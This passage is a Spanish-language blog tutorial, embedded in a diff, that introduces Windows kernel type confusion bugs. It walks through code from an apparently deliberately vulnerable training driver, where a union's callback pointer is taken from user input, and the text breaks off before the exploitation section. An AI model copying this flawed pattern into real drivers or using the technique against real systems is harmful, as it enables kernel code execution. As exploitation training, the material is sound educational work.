@@ -1,0 +1,574 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>0x05 - Introducción a Windows Kernel Type Confusion Vulnerabilidades // </title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.131.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="John Doe" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
+    
+
+    
+  
+
+
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="0x05 - Introducción a Windows Kernel Type Confusion Vulnerabilidades">
+  <meta name="twitter:description" content="En el último tutorial aprovechamos un “Write-What-Where” o un “Escribir Qué Dónde” dentro de Windows 7 (x86) y Windows 11 (x64).
+Igual que en los últimos tutoriales, introduciremos una nueva falla en Windows 7 (x86) kernel para obtener una base sólida sobre cómo ocurre la vulnerabilidad. Para ser más específicos, aprenderemos cómo aprovechar un Type Confusion!
+Table of Contents Qué es un Type Confusion (Alto Nivel) Usando el Código TypeConfusionIoctlHandler TriggerTypeConfusion TypeConfusionObjectInitializer Pruebas Dinámicas Explotación Qué es un Type Confusion (Alto Nivel) No estás familiarizado con lo que es un Type Confusion?">
+
+    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x05-introducci%C3%B3n-a-windows-kernel-type-confusion-vulnerabilidades/">
+  <meta property="og:site_name" content="wetw0rk">
+  <meta property="og:title" content="0x05 - Introducción a Windows Kernel Type Confusion Vulnerabilidades">
+  <meta property="og:description" content="En el último tutorial aprovechamos un “Write-What-Where” o un “Escribir Qué Dónde” dentro de Windows 7 (x86) y Windows 11 (x64).
+Igual que en los últimos tutoriales, introduciremos una nueva falla en Windows 7 (x86) kernel para obtener una base sólida sobre cómo ocurre la vulnerabilidad. Para ser más específicos, aprenderemos cómo aprovechar un Type Confusion!
+Table of Contents Qué es un Type Confusion (Alto Nivel) Usando el Código TypeConfusionIoctlHandler TriggerTypeConfusion TypeConfusionObjectInitializer Pruebas Dinámicas Explotación Qué es un Type Confusion (Alto Nivel) No estás familiarizado con lo que es un Type Confusion?">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-01-10T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-01-10T00:00:00+00:00">
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
+      <span class="app-header-title"></span>
+      <p> </p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+          </a>
+        
+          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
+            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">0x05 - Introducción a Windows Kernel Type Confusion Vulnerabilidades</h1>
+      <div class="post-meta">
+        <div>
+          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          Jan 10, 2025
+        </div>
+        <div>
+          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+          11 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>En el <a href="https://wetw0rk.github.io/posts/0x04-escribiendo-que-donde-en-el-kernel/">último tutorial</a> aprovechamos un &ldquo;Write-What-Where&rdquo; o un “Escribir Qué Dónde” dentro de Windows 7 (x86) y Windows 11 (x64).</p>
+<p>Igual que en los últimos tutoriales, introduciremos una nueva falla en Windows 7 (x86) kernel para obtener una base sólida sobre cómo ocurre la vulnerabilidad. Para ser más específicos, aprenderemos cómo aprovechar un Type Confusion!</p>
+<h1 id="table-of-contents">Table of Contents</h1>
+<ul>
+<li><a href="#qu%C3%A9-es-un-type-confusion-alto-nivel">Qué es un Type Confusion (Alto Nivel)</a></li>
+<li><a href="#usando-el-c%C3%B3digo">Usando el Código</a>
+<ul>
+<li><a href="#typeconfusionioctlhandler">TypeConfusionIoctlHandler</a></li>
+<li><a href="#triggertypeconfusion">TriggerTypeConfusion</a></li>
+<li><a href="#typeconfusionobjectinitializer">TypeConfusionObjectInitializer</a></li>
+</ul>
+</li>
+<li><a href="#pruebas-din%C3%A1micas">Pruebas Dinámicas</a></li>
+<li><a href="#explotaci%C3%B3n">Explotación</a></li>
+</ul>
+<h1 id="qué-es-un-type-confusion-alto-nivel">Qué es un Type Confusion (Alto Nivel)</h1>
+<p>No estás familiarizado con lo que es un Type Confusion? Comencemos con una descripción general de lo que es!</p>
+<p>Para usar un ejemplo no técnico, veamos una hipótesis con Dark Souls. En la imagen abajo podemos ver a <a href="https://darksouls.wiki.fextralife.com/Siegmeyer+of+Catarina">Siegmeyer of Catarina</a> sentado afuera de la entrada de <a href="https://darksouls.wiki.fextralife.com/Sen%27s+Fortress">Sen&rsquo;s Fortress</a>.</p>
+<p><img src="/0x05-Introduction-to-Windows-Kernel-Type-Confusion-Vulnerabilities/ds1.png" alt="alt text"></p>
+<p>Si miramos más cerca, podemos ver que detrás de Siegmeyer hay una <a href="https://darksouls.wiki.fextralife.com/Estus+Flask">Estus Flask</a> que funciona como cualquier taza, sin embargo en Dark Souls se usa para reponer tu salud.</p>
+<p><img src="/0x05-Introduction-to-Windows-Kernel-Type-Confusion-Vulnerabilities/ds1-2.png" alt="alt text"></p>
+<p>Dentro de Sen’s Fortress hay enemigos conocidos como “Man-Serpent soldiers”, estos enemigos se pueden ver hacia abajo. Siendo estas serpientes, quizás también contienen veneno.</p>
+<p><img src="/0x05-Introduction-to-Windows-Kernel-Type-Confusion-Vulnerabilities/ds1-3.png" alt="alt text"></p>
+<p>Dado que una Estus Flask contiene líquido, hipotéticamente se podría cambiar el líquido utilizado para reponer la salud por otra cosa o, en el peor de los casos, modificarlo?</p>
+<p>Dado que Siegmeyer está sumido en sus pensamientos, si abriéramos la puerta y él no se diera cuenta, hipotéticamente una serpiente podría tomar de el Estus Flask y reemplazar la cantidad que bebo con veneno. Si Siegmeyer no se da cuenta, morirá!</p>
+<p>Este ataque de la serpiente es muy similar al de un Type Confusion. Un <strong>Type Confusion</strong> ocurre cuando un programa asume incorrectamente que un objeto o variable es de un tipo cuando en realidad es de otro. Este tipo de desajuste puede tener consecuencias horribles.</p>
+<p>Podemos correlacionar esto con nuestro ejemplo:</p>
+<ol>
+<li>El <strong>programa</strong> (Siegmeyer) espera un tipo específico (poción de salud) basado en el objeto (Estus Flask).</li>
+<li>Un <strong>atacante</strong> (la serpiente) cambia la información a un tipo diferente sin que el programa se dé cuenta.</li>
+<li>El <strong>programa</strong> (Siegmeyer) utiliza el objeto y esto tiene consecuencias catastróficas.</li>
+</ol>
+<p>En términos técnicos, esto sucede cuando los tipos de variables del lenguaje de programación se convierten incorrectamente, por ejemplo en C++ encasillamiento inseguro (unsafe typecasting) o JavaScript con mecanografía suelta (&ldquo;loose typing&rdquo;). Luego, los atacantes pueden aprovechar estas vulnerabilidades para dañar la memoria o incluso ejecutar código.</p>
+<p>Con la descripción general completa, podemos comenzar y ver código!</p>
+<h1 id="usando-el-código">Usando el Código</h1>
+<p>Podemos comenzar identificando las ubicaciones de código adecuado.</p>
+<pre tabindex="0"><code>$ ls -l | grep Type  
+-rw-r--r-- 1 wetw0rk wetw0rk  7736 Oct 24 22:20 TypeConfusion.c
+-rw-r--r-- 1 wetw0rk wetw0rk  2954 Oct 24 22:20 TypeConfusion.h
+</code></pre><p>Al observar el código, nos centraremos en las siguientes funciones.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">TypeConfusionIoctlHandler</span>()
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">TriggerTypeConfusion</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">TypeConfusionObjectInitializer</span>()
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">TypeConfusionObjectCallback</span>()
+</span></span></code></pre></div><p>Empecemos desde arriba!</p>
+<h2 id="typeconfusionioctlhandler">TypeConfusionIoctlHandler</h2>
+<p><em>TypeConfusionIoctlHandler</em> es la función que se llamará al enviar el código de IOCTL. Igual como los ejemplos anteriores, convertimos nuestra información en un objeto / estructura. En este caso <code>PUSER_TYPE_CONFUSION_OBJECT</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">218</span> NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">219</span> <span style="color:#a6e22e">TypeConfusionIoctlHandler</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">220</span>     _In_ PIRP Irp,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">221</span>     _In_ PIO_STACK_LOCATION IrpSp
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">222</span> )
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">223</span> {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">224</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">225</span>     PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">226</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">227</span>     <span style="color:#a6e22e">UNREFERENCED_PARAMETER</span>(Irp);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">228</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">229</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">230</span>     UserTypeConfusionObject <span style="color:#f92672">=</span> (PUSER_TYPE_CONFUSION_OBJECT)IrpSp<span style="color:#f92672">-&gt;</span>Parameters.DeviceIoControl.Type3InputBuffer;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">231</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">232</span>     <span style="color:#66d9ef">if</span> (UserTypeConfusionObject)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">233</span>     {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">234</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">TriggerTypeConfusion</span>(UserTypeConfusionObject);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">235</span>     }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">236</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">237</span>     <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">238</span> }
+</span></span></code></pre></div><p>Echemonos una mirada a la estructura <code>PUSER_TYPE_CONFUSION_OBJECT</code> dentro de <em>TypeConfusion.h</em>.</p>
+<p>Dentro del código también podemos ver otra estructura definida, siendo esta estructura <code>_KERNEL_TYPE_CONFUSION_OBJECT</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">62</span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _USER_TYPE_CONFUSION_OBJECT
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">63</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">64</span>     ULONG_PTR ObjectID;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">65</span>     ULONG_PTR ObjectType;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">66</span> } USER_TYPE_CONFUSION_OBJECT, <span style="color:#f92672">*</span>PUSER_TYPE_CONFUSION_OBJECT;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">67</span> 
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">68</span> <span style="color:#960050;background-color:#1e0010">#</span>pragma <span style="color:#a6e22e">warning</span>(push)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">69</span> <span style="color:#960050;background-color:#1e0010">#</span>pragma <span style="color:#a6e22e">warning</span>(disable : <span style="color:#ae81ff">4201</span>)
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">70</span> <span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _KERNEL_TYPE_CONFUSION_OBJECT
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">71</span> {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">72</span>     ULONG_PTR ObjectID;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">73</span>     <span style="color:#66d9ef">union</span>
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">74</span>     {
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">75</span>         ULONG_PTR ObjectType;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">76</span>         FunctionPointer Callback;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">77</span>     };
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">78</span> } KERNEL_TYPE_CONFUSION_OBJECT, <span style="color:#f92672">*</span>PKERNEL_TYPE_CONFUSION_OBJECT;
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">79</span> <span style="color:#960050;background-color:#1e0010">#</span>pragma <span style="color:#a6e22e">warning</span>(pop)
+</span></span></code></pre></div><p>Si estás familiarizado con C, esto no debería ser demasiado complicado. Vemos dos punteros <em>unsigned long</em> cuando usamos la estructura <code>USER_TYPE_CONFUSION_OBJECT</code>.</p>
+<p>Dentro de la estructura <code>_KERNEL_TYPE_CONFUSION_OBJECT</code> vemos un puntero <em>unsigned long</em> y una <em>unión</em>. Dentro de la unión vemos un puntero <em>unsigned long</em> y un puntero de función.</p>
+<p>Desde la perspectiva de aprovechar la aplicación, este sería un objetivo ideal, porque <code>FunctionPointer</code> es un puntero a una función&hellip; como su nombre indica.</p>
+<p>Esto se puede ver en <em>Common.h</em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#ae81ff">70</span> <span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">void</span>(<span style="color:#f92672">*</span>FunctionPointer)();
+</span></span></code></pre></div><h2 id="triggertypeconfusion">TriggerTypeConfusion</h2>
+<p><strong>TriggerTypeConfusion</strong> es donde se pasa <code>PUSER_TYPE_CONFUSION_OBJECT</code>, esta función se puede ver abajo</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">105</span> NTSTATUS
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">106</span> <span style="color:#a6e22e">TriggerTypeConfusion</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">107</span>     _In_ PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">108</span> )
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">109</span> {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">110</span>     NTSTATUS Status <span style="color:#f92672">=</span> STATUS_UNSUCCESSFUL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">111</span>     PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">112</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">113</span>     <span style="color:#a6e22e">PAGED_CODE</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">114</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">115</span>     <span style="color:#66d9ef">__try</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">116</span>     {
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">117</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">118</span>         <span style="color:#75715e">// Verify if the buffer resides in user mode
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">119</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">120</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">121</span>         <span style="color:#a6e22e">ProbeForRead</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">122</span>             UserTypeConfusionObject,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">123</span>             <span style="color:#66d9ef">sizeof</span>(USER_TYPE_CONFUSION_OBJECT),
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">124</span>             (ULONG)<span style="color:#a6e22e">__alignof</span>(UCHAR)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">125</span>         );
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">126</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">127</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">128</span>         <span style="color:#75715e">// Allocate Pool chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">129</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">130</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">131</span>         KernelTypeConfusionObject <span style="color:#f92672">=</span> (PKERNEL_TYPE_CONFUSION_OBJECT)<span style="color:#a6e22e">ExAllocatePoolWithTag</span>(
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">132</span>             NonPagedPool,
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">133</span>             <span style="color:#66d9ef">sizeof</span>(KERNEL_TYPE_CONFUSION_OBJECT),
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">134</span>             (ULONG)POOL_TAG
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">135</span>         );
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">136</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">137</span>         <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>KernelTypeConfusionObject)
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">138</span>         {   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">139</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">140</span>             <span style="color:#75715e">// Unable to allocate Pool chunk
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">141</span>             <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">142</span>             
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">143</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[-] Unable to allocate Pool chunk</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">144</span>             
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">145</span>             Status <span style="color:#f92672">=</span> STATUS_NO_MEMORY;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">146</span>             <span style="color:#66d9ef">return</span> Status;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">147</span>         }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">148</span>         <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">149</span>         {   
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">150</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Tag: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">STRINGIFY</span>(POOL_TAG));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">151</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Type: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">STRINGIFY</span>(NonPagedPool));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">152</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Size: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">sizeof</span>(KERNEL_TYPE_CONFUSION_OBJECT));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">153</span>             <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Pool Chunk: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, KernelTypeConfusionObject);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">154</span>         }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">154</span>         }
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">156</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] UserTypeConfusionObject: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, UserTypeConfusionObject);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">157</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] KernelTypeConfusionObject: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, KernelTypeConfusionObject);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">158</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] KernelTypeConfusionObject Size: 0x%X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#66d9ef">sizeof</span>(KERNEL_TYPE_CONFUSION_OBJECT));
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">159</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">160</span>         KernelTypeConfusionObject<span style="color:#f92672">-&gt;</span>ObjectID <span style="color:#f92672">=</span> UserTypeConfusionObject<span style="color:#f92672">-&gt;</span>ObjectID;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">161</span>         KernelTypeConfusionObject<span style="color:#f92672">-&gt;</span>ObjectType <span style="color:#f92672">=</span> UserTypeConfusionObject<span style="color:#f92672">-&gt;</span>ObjectType;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">162</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">163</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] KernelTypeConfusionObject-&gt;ObjectID: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, KernelTypeConfusionObject<span style="color:#f92672">-&gt;</span>ObjectID);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">164</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] KernelTypeConfusionObject-&gt;ObjectType: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, KernelTypeConfusionObject<span style="color:#f92672">-&gt;</span>ObjectType);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">165</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">166</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">167</span> <span style="color:#960050;background-color:#1e0010">#</span>ifdef SECURE
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">168</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">169</span>         <span style="color:#75715e">// Secure Note: This is secure because the developer is properly setting &#39;Callback&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">170</span>         <span style="color:#75715e">// member of the &#39;KERNEL_TYPE_CONFUSION_OBJECT&#39; structure before passing the pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">171</span>         <span style="color:#75715e">// of &#39;KernelTypeConfusionObject&#39; to &#39;TypeConfusionObjectInitializer()&#39; function as
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">172</span>         <span style="color:#75715e">// parameter
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">173</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">174</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">175</span>         KernelTypeConfusionObject<span style="color:#f92672">-&gt;</span>Callback <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>TypeConfusionObjectCallback;
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">176</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">TypeConfusionObjectInitializer</span>(KernelTypeConfusionObject);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">177</span> <span style="color:#960050;background-color:#1e0010">#</span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">178</span>         <span style="color:#a6e22e">DbgPrint</span>(<span style="color:#e6db74">&#34;[+] Triggering Type Confusion</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">179</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">180</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">181</span>         <span style="color:#75715e">// Vulnerability Note: This is a vanilla Type Confusion vulnerability due to improper
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">182</span>         <span style="color:#75715e">// use of the &#39;UNION&#39; construct. The developer has not set the &#39;Callback&#39; member of
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">183</span>         <span style="color:#75715e">// the &#39;KERNEL_TYPE_CONFUSION_OBJECT&#39; structure before passing the pointer of
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">184</span>         <span style="color:#75715e">// &#39;KernelTypeConfusionObject&#39; to &#39;TypeConfusionObjectInitializer()&#39; function as
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">185</span>         <span style="color:#75715e">// parameter
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">186</span>         <span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#ae81ff">187</span> 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">188</span>         Status <span style="color:#f92672">=</span> <span style="color:#a6e22e">TypeConfusionObjectInitializer</span>(KernelTypeConfusionObject);
